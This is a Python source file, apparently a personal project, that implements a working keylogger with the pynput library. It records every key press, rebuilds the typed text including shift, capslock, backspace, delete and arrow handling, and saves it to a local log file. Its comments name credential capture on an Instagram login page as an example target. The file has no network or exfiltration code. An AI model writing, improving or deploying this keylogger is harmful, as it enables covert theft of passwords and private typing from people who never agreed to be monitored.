# The idea of this keylogger is:
# first:  map  keys that have actions or special shift events
# second: handle capslock and arrow key case
# third: be capable of handling delete,backspace and breaking or changing the line
# final goal: be a keylogger

# !! PS: slicing the line to realize many operations is key for correctly store in to the log file

# using Key to capture the keyboard keys
# using Listener to capture key press events like shift, capslock...
from pynput.keyboard import Key, Listener

# Map for special keys and their actions
key_map = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.tab: '<TAB>',
}

# Map for shift + numeric keyboard
shift_number_map = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
}

# Map for shift + special keys
special_char_map = {
    '`': '~',
    '\\': '|',
    '[': '{',
    ']': '}',
    "'": '"',
    ';': ':',
    ',': '<',
    '.': '>',
    '/': '?',
}

# global state for capslock, shift and line position
caps_on = False
shift_pressed = False
cursor_position = 0

# empty lines for now
lines = [""]


# always when a key is pressed
def writefile(key):
    global caps_on, shift_pressed, cursor_position, lines

    try:
        # try to emulate cursor line change
        # this is a generic keylogger, to more precise we need more context
        # keylogger to the instagram login´s page is an example of context

        line_index = 0
        relative_position = cursor_position

        # scroll through the lines use i as index
        for i, line in enumerate(lines):
            if relative_position <= len(line):
                line_index = i
                break
            # +1 to count '\n'
            relative_position -= len(line) + 1

        # backspace case
        # delete the previous char or merge the previous line
        if key == Key.backspace:
            # verify if backspace can delete
            if cursor_position > 0:
                if relative_position > 0:
                    lines[line_index] = lines[line_index][:relative_position - 1] + lines[line_index][
                                                                                    relative_position:]
                # verify if the lines can be merged
                else:
                    if line_index > 0:
                        cursor_position -= 1
                        previous_line = lines.pop(line_index - 1)
                        lines[line_index - 1] = previous_line + lines.pop(line_index)
            # backspace successful, update position
            cursor_position -= 1

        # delete case
        elif key == Key.delete:
            # verify if delete can be used for erase letters
            if relative_position < len(lines[line_index]):
                # slicing
                lines[line_index] = lines[line_index][:relative_position] + lines[line_index][relative_position + 1:]
            # delete and merge lines
            elif line_index + 1 < len(lines):
                next_line = lines.pop(line_index + 1)
                lines[line_index] += next_line

        # tries to emulate keyboard arrows movement
        # generic rules can be imprecise
        # up and down can work differently varying from context to context
        # again: need more context to obtain more precision
        elif key == Key.left:
            cursor_position = max(0, cursor_position - 1)
        elif key == Key.right:
            cursor_position = min(sum(len(line) + 1 for line in lines) - 1, cursor_position + 1)

        # special keys previously mapped
        elif key in key_map:
            # enter case
            if key == Key.enter:
                new_line = lines[line_index][relative_position:]
                lines[line_index] = lines[line_index][:relative_position]
                lines.insert(line_index + 1, new_line)
                cursor_position += 1
            # tab and space case
            else:
                lines[line_index] = lines[line_index][:relative_position] + key_map[key] + lines[line_index][
                                                                                           relative_position:]
                cursor_position += len(key_map[key])

        # verify if isn´t a special key
        elif hasattr(key, 'char') and key.char is not None:
            character = key.char

            # verify if is numeric
            if character.isdigit():
                # case shift numeric
                letter = shift_number_map[character] if shift_pressed else character
            elif character in special_char_map and shift_pressed:
                letter = special_char_map[character]
            # normal letters in upper or lower case
            else:
                if caps_on != shift_pressed:
                    letter = character.upper()
                else:
                    letter = character.lower()

            # update character position
            lines[line_index] = lines[line_index][:relative_position] + letter + lines[line_index][relative_position:]
            cursor_position += 1

        else:
            # any random key
            placeholder = f"<{key}>"
            lines[line_index] = lines[line_index][:relative_position] + placeholder + lines[line_index][
                                                                                      relative_position:]
            cursor_position += len(placeholder)

        # Save in the log file
        with open("log.txt", 'w') as file:
            file.write("\n".join(lines))

    # exception handling
    except Exception as e:
        with open("log.txt", 'a') as file:
            file.write(f"<ERROR: {e}>\n")


def on_press(key):
    global caps_on, shift_pressed

    if key == Key.caps_lock:
        # alternate caps state
        caps_on = not caps_on
    elif key in [Key.shift, Key.shift_r]:
        shift_pressed = True
    else:
        # capture the pressed key
        writefile(key)


def on_release(key):
    global shift_pressed

    # if shift is released update the state
    if key in [Key.shift, Key.shift_r]:
        shift_pressed = False

    # stop the keylogger whit esc
    # this is here to debug/exec finality
    if key == Key.esc:
        return False


# Starts the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()